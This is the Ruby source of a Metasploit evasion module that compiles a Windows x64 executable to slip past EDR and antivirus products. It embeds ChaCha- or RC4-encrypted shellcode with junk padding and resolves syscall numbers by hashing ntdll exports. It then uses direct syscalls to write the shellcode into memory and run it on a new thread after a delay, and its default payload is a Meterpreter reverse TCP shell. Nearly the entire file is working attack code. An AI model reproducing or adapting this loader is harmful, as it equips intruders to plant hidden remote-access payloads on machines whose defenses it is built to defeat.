require 'metasploit/framework/compiler/mingw'
require 'metasploit/framework/compiler/windows'
class MetasploitModule < Msf::Evasion
  RC4 = File.join(Msf::Config.data_directory, 'headers', 'windows', 'rc4.h')
  BASE64 = File.join(Msf::Config.data_directory, 'headers', 'windows', 'base64.h')
  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Direct windows syscall evasion technique',
        'Description' => %q{
          This module allows you to generate a Windows EXE that evades Host-based security products
          such as EDR/AVs. It uses direct windows syscalls to achieve stealthiness, and avoid EDR hooking.

          please try to use payloads that use a more secure transfer channel such as HTTPS or RC4
          in order to avoid payload's network traffic getting caught by network defense mechanisms.
          NOTE: for better evasion ratio, use high SLEEP values
        },
        'Author' => [ 'Yaz (kensh1ro)' ],
        'License' => MSF_LICENSE,
        'Platform' => 'windows',
        'Arch' => ARCH_X64,
        'Dependencies' => [ Metasploit::Framework::Compiler::Mingw::X64 ],
        'DefaultOptions' => {
          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
        },
        'Targets' => [['Microsoft Windows (x64)', {}]]
      )
      )
    register_options(
      [
        OptEnum.new('CIPHER', [ true, 'Shellcode encryption type', 'chacha', ['chacha', 'rc4']]),
        OptInt.new('SLEEP', [false, 'Sleep time in milliseconds before executing shellcode', 20000]),
      ]
    )

    register_advanced_options(
      [
        OptEnum.new('OptLevel', [ false, 'The optimization level to compile with', 'Os', Metasploit::Framework::Compiler::Mingw::OPTIMIZATION_FLAGS ]),
      ]
    )
  end

  def calc_hash(name)
    hash = @hash
    ror8 = ->(v) { ((v >> 8) & 0xffffffff) | ((v << 24) & 0xffffffff) }
    name.sub!('Nt', 'Zw')
    name << "\x00"
    for x in (0..name.length - 2).map { |i| name[i..i + 1] if name[i..i + 1].length == 2 }
      p_name = x.unpack('S')[0]
      hash ^= p_name + ror8.call(hash)
    end
    hash.to_s(16)
  end

  def nt_alloc
    %^
    __asm__("NtAllocateVirtualMemory: \\n\\
        mov [rsp +8], rcx          \\n\\
        mov [rsp+16], rdx\\n\\
        mov [rsp+24], r8\\n\\
        mov [rsp+32], r9\\n\\
        sub rsp, 0x28\\n\\
        mov ecx, 0x#{calc_hash 'NtAllocateVirtualMemory'}        \\n\\
        call GetSyscallNumber  \\n\\
        add rsp, 0x28 \\n\\
        mov rcx, [rsp +8]          \\n\\
        mov rdx, [rsp+16] \\n\\
        mov r8, [rsp+24] \\n\\
        mov r9, [rsp+32] \\n\\
        mov r10, rcx \\n\\
        syscall                    \\n\\
        ret \\n\\
    ");
    ^
  end

  def nt_close
    %^
    __asm__("NtClose: \\n\\
        mov [rsp +8], rcx       \\n\\
        mov [rsp+16], rdx \\n\\
        mov [rsp+24], r8 \\n\\
        mov [rsp+32], r9 \\n\\
        sub rsp, 0x28 \\n\\
        mov ecx, 0x#{calc_hash 'NtClose'}      \\n\\
        call GetSyscallNumber  \\n\\
        add rsp, 0x28 \\n\\
        mov rcx, [rsp +8]          \\n\\
        mov rdx, [rsp+16] \\n\\
        mov r8, [rsp+24] \\n\\
        mov r9, [rsp+32] \\n\\
        mov r10, rcx \\n\\
        syscall                    \\n\\
        ret \\n\\
    ");
    ^
  end

  def nt_create_thread
    %^
    __asm__("NtCreateThreadEx: \\n\\
        mov [rsp +8], rcx          \\n\\
        mov [rsp+16], rdx\\n\\
        mov [rsp+24], r8\\n\\
        mov [rsp+32], r9\\n\\
        sub rsp, 0x28\\n\\
        mov ecx, 0x#{calc_hash 'NtCreateThreadEx'}        \\n\\
        call GetSyscallNumber  \\n\\
        add rsp, 0x28\\n\\
        mov rcx, [rsp +8]          \\n\\
        mov rdx, [rsp+16]\\n\\
        mov r8, [rsp+24]\\n\\
        mov r9, [rsp+32]\\n\\
        mov r10, rcx\\n\\
        syscall                    \\n\\
        ret \\n\\
    ");
    ^
  end

  def nt_open_process
    %^
    __asm__("NtOpenProcess: \\n\\
        mov [rsp +8], rcx           \\n\\
        mov [rsp+16], rdx \\n\\
        mov [rsp+24], r8 \\n\\
        mov [rsp+32], r9 \\n\\
        sub rsp, 0x28 \\n\\
        mov ecx, 0x#{calc_hash 'NtOpenProcess'}        \\n\\
        call GetSyscallNumber  \\n\\
        add rsp, 0x28 \\n\\
        mov rcx, [rsp +8]         \\n\\
        mov rdx, [rsp+16] \\n\\
        mov r8, [rsp+24] \\n\\
        mov r9, [rsp+32] \\n\\
        mov r10, rcx \\n\\
        syscall                    \\n\\
        ret \\n\\
    ");
    ^
  end

  def nt_protect
    %^
    __asm__("NtProtectVirtualMemory: \\n\\
    push rcx \\n\\
    push rdx \\n\\
    push r8 \\n\\
    push r9 \\n\\
    mov ecx, 0x#{calc_hash 'NtProtectVirtualMemory'} \\n\\
    call GetSyscallNumber  \\n\\
    pop r9  \\n\\
    pop r8 \\n\\
    pop rdx \\n\\
    pop rcx \\n\\
    mov r10, rcx \\n\\
    syscall           \\n\\
    ret \\n\\
    ");
    ^
  end

  def nt_write
    %^
    __asm__("NtWriteVirtualMemory: \\n\\
        mov [rsp +8], rcx          \\n\\
        mov [rsp+16], rdx \\n\\
        mov [rsp+24], r8 \\n\\
        mov [rsp+32], r9 \\n\\
        sub rsp, 0x28 \\n\\
        mov ecx, 0x#{calc_hash 'NtWriteVirtualMemory'}        \\n\\
        call GetSyscallNumber  \\n\\
        add rsp, 0x28 \\n\\
        mov rcx, [rsp +8]          \\n\\
        mov rdx, [rsp+16] \\n\\
        mov r8, [rsp+24] \\n\\
        mov r9, [rsp+32] \\n\\
        mov r10, rcx \\n\\
        syscall                    \\n\\
        ret \\n\\
    ");
    ^
  end

  def headers
    @headers = "#include <windows.h>\n"
    @headers << "#include \"#{BASE64}\"\n"
    @headers << "#include \"#{RC4}\"\n" if datastore['CIPHER'] == 'rc4'
    @headers << "#include \"chacha.h\"\n" if datastore['CIPHER'] == 'chacha'
    @headers
  end

  def defines
    %^
        #define _SEED 0x#{@hash.to_s(16)}
        #define _ROR8(v) (v >> 8 | v << 24)
        #define MAX_SYSCALLS 500
        #define _RVA2VA(Type, DllBase, Rva) (Type)((ULONG_PTR) DllBase + Rva)


        typedef struct _SYSCALL_ENTRY
        {
            DWORD Hash;
            DWORD Address;
        } SYSCALL_ENTRY, *P_SYSCALL_ENTRY;

        typedef struct _SYSCALL_LIST
        {
            DWORD Count;
            SYSCALL_ENTRY Entries[MAX_SYSCALLS];
        } SYSCALL_LIST, *P_SYSCALL_LIST;

        typedef struct _PEB_LDR_DATA {
            BYTE Reserved1[8];
            PVOID Reserved2[3];
            LIST_ENTRY InMemoryOrderModuleList;
        } PEB_LDR_DATA, *P_PEB_LDR_DATA;

        typedef struct _LDR_DATA_TABLE_ENTRY {
            PVOID Reserved1[2];
            LIST_ENTRY InMemoryOrderLinks;
            PVOID Reserved2[2];
            PVOID DllBase;
        } LDR_DATA_TABLE_ENTRY, *P_LDR_DATA_TABLE_ENTRY;

        typedef struct _PEB {
            BYTE Reserved1[2];
            BYTE BeingDebugged;
            BYTE Reserved2[1];
            PVOID Reserved3[2];
            P_PEB_LDR_DATA Ldr;
        } PEB, *P_PEB;

        typedef struct _PS_ATTRIBUTE
        {
            ULONG  Attribute;
            SIZE_T Size;
            union
            {
                ULONG Value;
                PVOID ValuePtr;
            } u1;
            PSIZE_T ReturnLength;
        } PS_ATTRIBUTE, *PPS_ATTRIBUTE;

        typedef struct _UNICODE_STRING
        {
            USHORT Length;
            USHORT MaximumLength;
            PWSTR  Buffer;
        } UNICODE_STRING, *PUNICODE_STRING;

        typedef struct _OBJECT_ATTRIBUTES
        {
            ULONG           Length;
            HANDLE          RootDirectory;
            PUNICODE_STRING ObjectName;
            ULONG           Attributes;
            PVOID           SecurityDescriptor;
            PVOID           SecurityQualityOfService;
        } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

        typedef struct _CLIENT_ID
        {
            HANDLE UniqueProcess;
            HANDLE UniqueThread;
        } CLIENT_ID, *PCLIENT_ID;

        typedef struct _PS_ATTRIBUTE_LIST
        {
            SIZE_T       TotalLength;
            PS_ATTRIBUTE Attributes[1];
        } PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

        EXTERN_C NTSTATUS NtAllocateVirtualMemory(
            IN HANDLE ProcessHandle,
            IN OUT PVOID * BaseAddress,
            IN ULONG ZeroBits,
            IN OUT PSIZE_T RegionSize,
            IN ULONG AllocationType,
            IN ULONG Protect);

        EXTERN_C NTSTATUS NtProtectVirtualMemory(
            IN HANDLE ProcessHandle,
            IN OUT PVOID * BaseAddress,
            IN OUT PSIZE_T RegionSize,
            IN ULONG NewProtect,
            OUT PULONG OldProtect);

        EXTERN_C NTSTATUS NtCreateThreadEx(
            OUT PHANDLE ThreadHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
            IN HANDLE ProcessHandle,
            IN PVOID StartRoutine,
            IN PVOID Argument OPTIONAL,
            IN ULONG CreateFlags,
            IN SIZE_T ZeroBits,
            IN SIZE_T StackSize,
            IN SIZE_T MaximumStackSize,
            IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);

        EXTERN_C NTSTATUS NtWriteVirtualMemory(
            IN HANDLE ProcessHandle,
            IN PVOID BaseAddress,
            IN PVOID Buffer,
            IN SIZE_T NumberOfBytesToWrite,
            OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

        EXTERN_C NTSTATUS NtOpenProcess(
            OUT PHANDLE ProcessHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes,
            IN PCLIENT_ID ClientId OPTIONAL);

        EXTERN_C NTSTATUS NtClose(
            IN HANDLE Handle);
        ^
  end

  def syscall_parser
    %@
    SYSCALL_LIST _SyscallList;

    DWORD HashSyscall(PCSTR FunctionName)
    {
        DWORD i = 0;
        DWORD Hash = _SEED;

        while (FunctionName[i])
        {
            WORD PartialName = *(WORD*)((ULONG64)FunctionName + i++);
            Hash ^= PartialName + _ROR8(Hash);
        }

        return Hash;
    }

    BOOL PopulateSyscallList()
    {
        // Return early if the list is already populated.
        if (_SyscallList.Count) return TRUE;

        P_PEB Peb = (P_PEB)__readgsqword(0x60);
        P_PEB_LDR_DATA Ldr = Peb->Ldr;
        PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
        PVOID DllBase = NULL;

        // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
        // in the list, so it's safer to loop through the full list and find it.
        P_LDR_DATA_TABLE_ENTRY LdrEntry;
        for (LdrEntry = (P_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (P_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
        {
            DllBase = LdrEntry->DllBase;
            PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
            PIMAGE_NT_HEADERS NtHeaders = _RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
            PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
            DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            if (VirtualAddress == 0) continue;

            ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);

            // If this is NTDLL.dll, exit loop.
            PCHAR DllName = _RVA2VA(PCHAR, DllBase, ExportDirectory->Name);

            if ((*(ULONG*)DllName) != 'ldtn') continue;
            if ((*(ULONG*)(DllName + 4)) == 'ld.l') break;
        }

        if (!ExportDirectory) return FALSE;

        DWORD NumberOfNames = ExportDirectory->NumberOfNames;
        PDWORD Functions = _RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
        PDWORD Names = _RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
        PWORD Ordinals = _RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

        // Populate _SyscallList with unsorted Zw* entries.
        DWORD i = 0;
        P_SYSCALL_ENTRY Entries = _SyscallList.Entries;
        do
        {
            PCHAR FunctionName = _RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);

            // Is this a system call?
            if (*(USHORT*)FunctionName == 'wZ')
            {
                Entries[i].Hash = HashSyscall(FunctionName);
                Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];

                i++;
                if (i == MAX_SYSCALLS) break;
            }
        } while (--NumberOfNames);

        // Save total number of system calls found.
        _SyscallList.Count = i;

        // Sort the list by address in ascending order.
        for (DWORD i = 0; i < _SyscallList.Count - 1; i++)
        {
            for (DWORD j = 0; j < _SyscallList.Count - i - 1; j++)
            {
                if (Entries[j].Address > Entries[j + 1].Address)
                {
                    // Swap entries.
                    SYSCALL_ENTRY TempEntry;

                    TempEntry.Hash = Entries[j].Hash;
                    TempEntry.Address = Entries[j].Address;

                    Entries[j].Hash = Entries[j + 1].Hash;
                    Entries[j].Address = Entries[j + 1].Address;

                    Entries[j + 1].Hash = TempEntry.Hash;
                    Entries[j + 1].Address = TempEntry.Address;
                }
            }
        }

        return TRUE;
    }

    extern DWORD GetSyscallNumber(DWORD FunctionHash)
    {
        if (!PopulateSyscallList()) return -1;
        for (DWORD i = 0; i < _SyscallList.Count; i++)
        {
            if (FunctionHash == _SyscallList.Entries[i].Hash)
            {
                return i;
            }
        }
        return -1;
    }
    @
  end

  def exec_func
    %^
        char* enc_shellcode = "#{get_payload}";
        DWORD exec(void *buffer)
        {
            void (*function)();
            function = (void (*)())buffer;
            function();
        }
        ^
  end

  def inject
    s = "int i; for(i=0;i<10;i++){Sleep(#{datastore['SLEEP']} / 10);}"
    @inject = %@

        void inject()
        {
            HANDLE pHandle;
            DWORD old = 0;
            CLIENT_ID cID = {0};
            OBJECT_ATTRIBUTES OA = {0};
            int b64len = strlen(enc_shellcode);
            PBYTE shellcode = (PBYTE)malloc(b64len);
            SIZE_T size = base64decode(shellcode, enc_shellcode, b64len);
            PVOID bAddress = NULL;
            int process_id = GetCurrentProcessId();
            cID.UniqueProcess = process_id;
            NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &OA, &cID);
            NtAllocateVirtualMemory(pHandle, &bAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            int n = 0;
            PBYTE temp = (PBYTE)malloc(size);
            @
    if datastore['CIPHER'] == 'rc4'
      @inject << %@
            #{Rex::Text.to_c key, Rex::Text::DefaultWrap, 'key'}
            RC4(key, shellcode, temp, size);
            NtWriteVirtualMemory(pHandle, bAddress, temp, size, NULL);
            @
    else
      @inject << %@
            #{Rex::Text.to_c key, Rex::Text::DefaultWrap, 'key'}
            #{Rex::Text.to_c iv, Rex::Text::DefaultWrap, 'iv'}
            chacha_ctx ctx;
            chacha_keysetup(&ctx, key, 256, 96);
            chacha_ivsetup(&ctx, iv);
            chacha_encrypt_bytes(&ctx, shellcode, temp, size);
            NtWriteVirtualMemory(pHandle, bAddress, temp, size, NULL);
            @
    end
    @inject << %@
            NtProtectVirtualMemory(pHandle, &bAddress, &size, PAGE_EXECUTE, &old);
            #{s if datastore['SLEEP'] > 0};
            HANDLE thread = NULL;
            NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL, pHandle, exec, bAddress, NULL, NULL, NULL, NULL, NULL);
            WaitForSingleObject(thread, INFINITE);
            NtClose(thread);
            NtClose(pHandle);
        }
        @
  end

  def main
    %^
        int main()
        {
            inject();
        }
        ^
  end

  def key
    if datastore['CIPHER'] == 'rc4'
      @key ||= Rex::Text.rand_text_alpha(32..64)
    else
      @key ||= Rex::Text.rand_text(32)
    end
  end

  def iv
    if datastore['CIPHER'] == 'chacha'
      @iv ||= Rex::Text.rand_text(12)
    end
  end

  def get_payload
    junk = Rex::Text.rand_text(10..1024)
    p = payload.encoded + junk
    vprint_status("Payload size: #{p.size} = #{payload.encoded.size} + #{junk.size} (junk)")
    if datastore['CIPHER'] == 'chacha'
      chacha = Rex::Crypto::Chacha20.new(key, iv)
      p = chacha.chacha20_crypt(p)
      Rex::Text.encode_base64 p
    else
      opts = { format: 'rc4', key: key }
      Msf::Simple::Buffer.transform(p, 'base64', 'shellcode', opts)
    end
  end

  def generate_code(src, opts = {})
    comp_obj = Metasploit::Framework::Compiler::Mingw::X64.new(opts)
    compiler_out = comp_obj.compile_c(src)
    unless compiler_out.empty?
      elog(compiler_out)
      raise Metasploit::Framework::Compiler::Mingw::UncompilablePayloadError, 'Compilation error. Check the logs for further information.'
    end
    comp_file = "#{opts[:f_name]}.exe"
    raise Metasploit::Framework::Compiler::Mingw::CompiledPayloadNotFoundError unless File.exist?(comp_file)

    bin = File.binread(comp_file)
    file_create(bin)
    comp_obj.cleanup_files
  end

  def run
    @hash = rand 2**28..2**32 - 1
    comp_opts = '-masm=intel -w -mwindows '
    src = headers
    src << defines
    src << nt_alloc
    src << nt_close
    src << nt_create_thread
    src << nt_open_process
    src << nt_protect
    src << nt_write
    src << syscall_parser
    src << exec_func
    src << inject
    src << main
    # obf_src =  Metasploit::Framework::Compiler::Windows.generate_random_c src
    path = Tempfile.new('main').path
    vprint_good "Saving temporary source file in #{path}"
    compile_opts =
      {
        strip_symbols: true,
        compile_options: comp_opts,
        f_name: path,
        opt_lvl: datastore['OptLevel']
      }
    generate_code src, compile_opts
  end

end
